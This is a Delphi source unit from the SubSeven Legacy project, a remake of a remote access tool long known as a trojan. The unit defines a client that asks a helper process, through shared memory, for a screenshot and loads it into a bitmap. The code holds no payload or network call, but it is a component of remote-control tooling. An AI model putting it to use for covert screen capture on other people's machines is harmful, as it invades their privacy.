{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit S7ScreenClient;

interface

uses S7InterProcessCommunication, Winapi.Windows, VCL.Graphics, System.Classes;

type
  TS7BitBltInfo = record
    ScreenId : Cardinal;
  end;
  PS7BitBltInfo = ^TS7BitBltInfo;

  TS7ScreenClient = class(TS7InterProcessCommunicationClient)
  private

  protected

  public
    {@C}
    constructor Create(); overload;

    {@M}
    function BitBlt(var ABitmap : TBitmap) : Boolean;
  end;

implementation

uses S7Protocol, System.SysUtils;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TS7ScreenClient.Create();
begin
  inherited Create(S7_MEM_SCREENHELPER_USR, S7_MEM_SCREENHELPER_MSIZE);
  ///

end;

{-------------------------------------------------------------------------------
  ___bitblt
-------------------------------------------------------------------------------}
function TS7ScreenClient.BitBlt(var ABitmap : TBitmap) : Boolean;
var AInfo       : TS7BitBltInfo;
    ABufferSize : Int64;
    AStream     : TMemoryStream;
begin
  result  := False;
  ABitmap := nil;
  try
    ZeroMemory(@AInfo, SizeOf(TS7BitBltInfo));
    ///

    AInfo.ScreenId := 0;

    ///
    self.WriteBuffer(@AInfo, SizeOf(TS7BitBltInfo));

    self.Query();

    if self.WaitForResult(1000) = WAIT_TIMEOUT then
      Exit();

    AStream := self.ReadBuffer();
    try
      ABitmap := TBitmap.Create();

      ABitmap.LoadFromStream(AStream);

      ///
      result := True;
    finally
      if Assigned(AStream) then
        FreeAndNil(AStream);
    end;
  except
    if Assigned(ABitmap) then
      FreeAndNil(ABitmap);
  end;
end;

end.
